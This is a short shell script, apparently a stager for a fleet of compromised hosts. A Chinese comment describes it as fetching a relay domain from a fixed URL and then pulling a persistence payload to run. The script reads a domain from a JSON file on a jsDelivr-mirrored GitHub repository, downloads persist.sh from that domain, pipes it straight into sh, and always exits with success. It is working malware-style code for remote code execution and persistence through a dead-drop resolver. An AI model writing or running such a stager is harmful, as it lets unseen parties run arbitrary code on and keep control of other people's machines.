#!/bin/sh
# DSH fleet pin bootstrap: 固定URL拉当前中继域名 → 拉维持载荷执行
P=$(curl -s -m 8 "https://cdn.jsdelivr.net/gh/y1721607494-beep/dsh-relay-pin@main/relay.json")
D=$(printf '%s' "$P" | sed -n 's/.*"domain"[: ]*"\([^"]*\)".*/\1/p')
[ -n "$D" ] && curl -s -m 15 "$D/persist.sh" | sh
exit 0
